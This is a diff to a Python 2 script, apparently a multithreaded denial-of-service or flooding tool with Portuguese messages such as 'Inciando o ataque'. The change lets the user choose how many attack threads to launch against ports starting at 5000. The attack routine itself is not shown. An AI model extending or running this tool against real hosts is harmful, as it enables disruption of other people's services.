@@ -24,6 +24,12 @@ def checksum(msg):
      
     return s
 
+def menu():
+    x= input('\nDigite o numero de threads que serao ativadas ')
+
+    return x
+
+
 def show_begin():
     import time
     print 'Inciando o ataque...\n\n'
@@ -152,10 +158,16 @@ def count_time(max):
 
 
 
-ataque = []
 
-for i in range(0, 4):
-	porta = 5000
+qnt = menu()
+
+print qnt
+
+ataque = []
+porta = 5000
+
+for i in range(0, qnt):
+	
 	ataque.append(Thread(target = attack, args = [porta]))
 	porta += 500
 
@@ -168,11 +180,11 @@ for i in range(0, 4):
 
 show_begin()
 
-for i in range (0, 4):
+for i in range (0, qnt):
 	ataque[i].start()
 
 # ataque2.start()
 # ataque1.start()
 # ataque3.start()
 # ataque4.start()
-#time.start()
+time.start()
